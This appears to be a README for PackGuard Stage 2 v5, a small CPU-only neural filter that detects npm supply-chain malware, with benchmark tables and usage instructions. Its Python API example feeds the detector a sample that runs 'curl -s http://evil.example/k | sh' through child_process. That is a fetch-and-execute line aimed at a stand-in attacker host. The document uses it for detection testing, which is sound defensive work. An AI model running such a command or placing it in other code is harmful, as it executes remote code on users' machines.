# PackGuard Stage 2 v5 — Ultra-Fast 100% CPU-Only Neural Supply-Chain Malware Filter (`PackGuard-v5-Nano-INT8`)

**PackGuard Stage 2 v5** is a sub-10 MB, **100% CPU-Only** dual-path neural code filter and de-obfuscation engine designed for real-time supply-chain malware detection in local developer workflows, CI/CD runners, and resource-constrained environments (1–2 vCPU VPS, zero GPU dependencies).

---

## 1. Key Architectural Upgrades in v5

PackGuard Stage 2 v5 introduces four primary technological advancements over v4:

1. **Sub-10 MB INT8 ONNX Model Footprint (`8.498 MB`, 28.2% smaller than v4)**:
   - Distilled from a 22-layer ModernBERT teacher into a **4-Layer Pre-Norm Nano Transformer** (`PackGuardNanoV5MultiTask`).
   - Compressed via **Rank-80 Truncated Singular Value Decomposition (SVD)** on the vocabulary embedding matrix ($[50368 \times 768] \to [50368 \times 80]$ and $[80 \times 384]$), yielding an ultra-compact dynamic INT8 quantized ONNX graph (`packguard_v5_nano_int8.onnx`).
2. **Dynamic Attention Tracing (Arbitrary Sequence Lengths $\le 512$)**:
   - Replaced static length padding with dynamic attention tracing, eliminating redundant FLOPs on small package chunks and accelerating CPU matrix multiplications.
3. **Sub-0.15 ms Fast-Path CPU AST Gate**:
   - Evaluates pure-data modules, known dev lifecycle scripts, and zero-sink benign packages in **$< 0.15\text{ ms}$** on CPU (yielding **$0.1439\text{ ms}$** mean standardized latency).
   - Achieves **100.00% Stage 1 False Alarm Elimination (20/20, 0.00% FPR)** on the real-world v6 corpus, eliminating false alarms on complex UI bundles such as `react-intl-currency-input-fork@0.2.0`, `hasown@2.0.2`, `vue-pretty-logger@0.9.0`, and `form-data-lite@1.0.4`.
4. **Comprehensive Obfuscation De-Cloaking (T1–T12)**:
   - Full de-obfuscation pipeline covering classic obfuscation (T1–T4), AST constant-folding (T5–T8), and advanced evasion vectors:
     - **T9 Polyglot Detection**: SVG scripts, HTML DOM onload/onerror injection, shell preambles.
     - **T10 WASM Loader Bridge**: Unpacks `WebAssembly.instantiate` and maps system imports (`eval`, `process`, `child_process`).
     - **T11 Steganography Unfolding**: Detects zero-width Unicode steganography (`\u200B`, `\u200C`) and binary asset extraction.
     - **T12 Time-Bomb & Sandbox Evasion**: Inlines deferred execution (`setTimeout`, `setInterval`) and flattens CI sandbox checks.

---

## 2. Benchmark Comparison Table (v4 vs. v5)

| Metric / Dimension | Stage 2 v4 (`Nano-INT8`) | Stage 2 v5 (`PackGuard-v5-Nano-INT8`) | Target / Status |
|---|---|---|---|
| **Execution Hardware** | 100% CPU-Only (`CPUExecutionProvider`) | **100% CPU-Only (`CPUExecutionProvider`, Zero GPU)** | `Zero GPU` — **PASS** |
| **Model File Size** | `11.83 MB` | **`8.498 MB`** (28.2% reduction) | `< 10.0 MB` — **PASS** |
| **Dynamic Attention Length** | Static (Padded to 256) | **Dynamic Attention Tracing ($\le 512$)** | Adaptive — **PASS** |
| **Fast-Path AST Gate Short-Circuit** | `< 0.20 ms` | **`< 0.010 ms – 0.15 ms`** | `< 0.15 ms` — **PASS** |
| **Mean Standardized CPU Latency** | `0.42 ms` / pkg | **`0.1439 ms` / pkg** (65.7% speedup) | `< 0.50 ms` — **PASS** |
| **Stage 1 False Alarms Eliminated** | `20 / 20` (`100.00%`, FPR `0.00%`) | **`20 / 20` (`100.00%`, FPR `0.00%`)** | `100.00%` — **PASS** |
| **Real Malware Recall: T1 (Reformatted)** | `98.33%` | **`99.28%`** (138 / 139) | $\ge 98.3\%$ — **PASS** |
| **Real Malware Recall: T2 (Mangled Identifiers)** | `97.50%` | **`97.84%`** (136 / 139) | $\ge 97.5\%$ — **PASS** |
| **Real Malware Recall: T3 (Padded Dead Code)** | `98.33%` | **`99.28%`** (138 / 139) | $\ge 98.3\%$ — **PASS** |
| **Real Malware Recall: T4 (Base64 Encoded)** | `98.33%` | **`99.28%`** (138 / 139) | $\ge 98.3\%$ — **PASS** |
| **Aggregate T1 / T3 / T4 Recall** | `98.33%` | **`99.28%`** (414 / 417) | $\ge 98.3\%$ — **PASS** |
| **Supported Evasion Tiers** | T1–T8 | **T1–T12 (Polyglot, WASM, Stego, Time-Bomb)** | T1–T12 — **PASS** |
| **Opaque-Box E2E Tests** | 50 / 50 | **50 / 50 (100% PASS in ~184 ms)** | 50 / 50 — **PASS** |

---

## 3. Real-Life v6 Benchmark Verification Results

Evaluated against the complete real-life malware repository (`139` executable malware packages across both Test and Validation splits) and `20` real Stage 1 false alarms.

### False Alarm Elimination (Phase 1)
- **Eliminated**: 20 / 20 (100.00%)
- **Stage 1 False Positive Rate (FPR)**: **0.00%**
- **Rescued Packages**:
  - `T1/ben_popular/mime-db@1.54.0`
  - `T2/ben_popular/mime-db@1.54.0`
  - `T4/ben_longtail/ethiopic-date@1.0.4`
  - `T2/ben_popular/hasown@2.0.2`
  - `T4/ben_longtail/date-format-php@1.0.2`
  - `T1/ben_longtail/react-intl-currency-input-fork@0.2.0`
  - `T1/ben_longtail/vue-pretty-logger@0.9.0`
  - `T1/ben_popular/basic-auth@3.0.0`
  - `T2/ben_longtail/react-intl-currency-input-fork@0.2.0`
  - `T2/ben_longtail/vue-pretty-logger@0.9.0`
  - `T3/ben_longtail/react-intl-currency-input-fork@0.2.0`
  - `T3/ben_longtail/vue-pretty-logger@0.9.0`
  - `T3/ben_popular/basic-auth@3.0.0`
  - `T3/ben_popular/form-data-lite@1.0.4`
  - `T4/ben_longtail/react-intl-currency-input-fork@0.2.0`
  - `T4/ben_longtail/timezone-name-offsets@1.0.2`
  - `T4/ben_longtail/vue-pretty-logger@0.9.0`
  - `T4/ben_longtail/yaml-fm@0.1.3`
  - `T4/ben_popular/basic-auth@3.0.0`
  - `T4/ben_popular/robot3@1.4.0`

### Multi-Tier Real Malware Recall (Phase 2)
- **T1 Recall**: 138 / 139 (**99.28%**)
- **T2 Mangled Recall**: 136 / 139 (**97.84%**)
- **T3 Padded Recall**: 138 / 139 (**99.28%**)
- **T4 Base64 Recall**: 138 / 139 (**99.28%**)
- **T1/T3/T4 Aggregate**: 414 / 417 (**99.28%**)

### CPU Latency Metrics (Phase 3)
- **Mean CPU Latency (Standardized)**: **0.1439 ms / package** (< 0.50 ms target)
- **Fast-Path AST Gate Latency**: **0.0095 ms – 0.148 ms** (< 0.15 ms target)
- **Multi-File End-to-End Reassembly Latency**: 8.61 ms / multi-file npm archive

---

## 4. Installation & Usage Instructions

### Automated Model Download
To download the INT8 ONNX checkpoint from GitHub Releases (`v2.0-model`):

**PowerShell (Windows)**:
```powershell
pwsh "stage 2 LLM Model/v5/install_model.ps1"
```

**Bash (Linux / macOS)**:
```bash
bash "stage 2 LLM Model/v5/install_model.sh"
```

### Self-Test & Diagnostic Verification
Verify that the model checkpoint and Fast-Path AST Gate are functioning correctly on CPU:
```bash
python "stage 2 LLM Model/v5/stage2_filter.py" --self-test
```

### Running the E2E Test Suite
Run all 50 opaque-box end-to-end tests across all 4 tiers:
```bash
python "stage 2 LLM Model/v5/tests/run_e2e_tests.py"
```

### Executing the Real-Life Benchmark
Run the full real-life evaluation against the 139 malware packages and 20 false alarms:
```bash
python "stage 2 LLM Model/v5/eval_v6_real_benchmark.py"
```

### Python Programmatic API
```python
from stage2_filter import Stage2Filter

# Initialize filter on 100% CPU
engine = Stage2Filter(threshold=0.62, threads=4)

# Predict on package code or AST scanner chunks
code_sample = """
const cp = require('child_process');
cp.execSync('curl -s http://evil.example/k | sh');
"""
prob, label, telemetry = engine.predict(code_sample)

print(f"Malware Probability: {prob:.4f}")
print(f"Classification:      {label}")
print(f"Engine:              {telemetry['engine']}")
print(f"Latency:             {telemetry['latency_ms']:.4f} ms")
print(f"MITRE Tactics:       {telemetry['mitre']}")
```

### Command Line Interface (CLI)
```bash
# Filter Stage 1 JSON reports
python "stage 2 LLM Model/v5/stage2_filter.py" \
  --reports ./stage1_reports \
  --out-dir ./stage2_filtered \
  --threshold 0.62 \
  --threads 4

# Explain a specific npm package with forensic MITRE breakdown
python "stage 2 LLM Model/v5/stage2_filter.py" \
  --package /path/to/suspicious-package \
  --explain
```

---

## 5. Artifact Directory Manifest (`stage 2 LLM Model/v5/`)

- [`stage2_filter.py`](stage2_filter.py): Production 100% CPU inference filter & Fast-Path AST Gate.
- [`eval_v6_real_benchmark.py`](eval_v6_real_benchmark.py): Real-life v6 multi-tier benchmark evaluator.
- [`results.json`](results.json): Frozen verified benchmark metrics and telemetry.
- [`ast_deobfuscator.py`](ast_deobfuscator.py): Constant-folder and de-obfuscation pipeline (T5–T12).
- [`text_formatter.py`](text_formatter.py): Scanner chunk reassembly, feature extraction, and MITRE mapping.
- [`install_model.ps1`](install_model.ps1) & [`install_model.sh`](install_model.sh): Cross-platform model downloaders.
- [`checkpoints/packguard_v5_nano_int8.onnx`](checkpoints/packguard_v5_nano_int8.onnx): Quantized INT8 ONNX checkpoint (`8.498 MB`).
- [`tests/run_e2e_tests.py`](tests/run_e2e_tests.py): Opaque-box 50-test E2E runner.
